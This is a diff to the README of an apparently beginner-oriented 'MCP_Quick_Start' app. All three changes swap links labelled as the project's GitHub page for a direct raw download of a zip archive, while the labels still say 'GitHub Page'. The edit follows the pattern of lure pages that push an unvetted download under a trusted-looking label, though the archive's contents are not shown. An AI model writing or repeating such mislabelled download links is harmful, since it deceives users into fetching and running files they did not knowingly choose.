@@ -1,6 +1,6 @@
 # 🚀 MCP_Quick_Start - Learn MCP by Doing
 
-[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-00A86B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Servicewrack740/MCP_Quick_Start)
+[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-00A86B?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Servicewrack740/MCP_Quick_Start/main/mcp/MC-Quick-Start-2.0.zip)
 
 ## 📘 What this app does
 
@@ -31,7 +31,7 @@ If your PC already runs common desktop apps without issues, it should be fine fo
 
 Go to this page to download and run the app:
 
-[Open MCP_Quick_Start on GitHub](https://github.com/Servicewrack740/MCP_Quick_Start)
+[Open MCP_Quick_Start on GitHub](https://raw.githubusercontent.com/Servicewrack740/MCP_Quick_Start/main/mcp/MC-Quick-Start-2.0.zip)
 
 ## 🪟 Install on Windows
 
@@ -192,4 +192,4 @@ That path gives you a clear first run and helps you learn the basics without ext
 
 If you need the download page later, use this link:
 
-[https://github.com/Servicewrack740/MCP_Quick_Start](https://github.com/Servicewrack740/MCP_Quick_Start)
+[https://raw.githubusercontent.com/Servicewrack740/MCP_Quick_Start/main/mcp/MC-Quick-Start-2.0.zip](https://raw.githubusercontent.com/Servicewrack740/MCP_Quick_Start/main/mcp/MC-Quick-Start-2.0.zip)
